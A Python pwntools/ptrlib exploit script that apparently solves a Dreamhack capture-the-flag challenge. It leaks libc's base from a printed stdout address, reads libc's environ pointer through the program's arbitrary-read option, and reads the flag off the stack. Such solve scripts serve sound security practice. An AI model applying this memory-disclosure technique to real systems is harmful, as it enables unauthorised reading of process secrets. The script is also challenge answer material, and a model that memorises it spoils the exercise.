#!/usr/bin/env python
import sys
import ptrlib as ptr
import pwn

exe = ptr.ELF("./environ_patched")
libc = ptr.ELF("./libc.so.6")
# ld = ptr.ELF("")


def connect():
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        return pwn.remote("host3.dreamhack.games", 22629)
    else:
        return pwn.process(exe.filepath)


def unwrap(x):
    if x is None:
        ptr.logger.error("Failed to unwrap")
        exit(1)
    else:
        return x


def main():
    io = connect()

    def read(addr: int) -> bytes:
        io.sendline(b"1")
        io.sendlineafter("Addr: ", str(addr))
        return io.recvuntil(">").strip(b">")

    stdout_offset = unwrap(libc.symbol("_IO_2_1_stdout_"))
    io.recvuntil("stdout: ")
    stdout_leak = int(io.recvline().strip(b"\n"), 16)
    libc.base = stdout_leak - stdout_offset

    environ_addr = unwrap(libc.symbol("environ"))
    environ = ptr.u64(read(environ_addr))
    stack_base = environ - 0x20B68
    ptr.logger.info(f"environ: {hex(environ)}")
    ptr.logger.info(f"stack: {hex(stack_base)}")

    flag_addr = stack_base + 0x1F600
    ptr.logger.info(f"flag_addr: {hex(flag_addr)}")
    flag = read(flag_addr).strip(b"\n").decode()
    ptr.logger.info(f"flag: {flag}")

    return


if __name__ == "__main__":
    main()
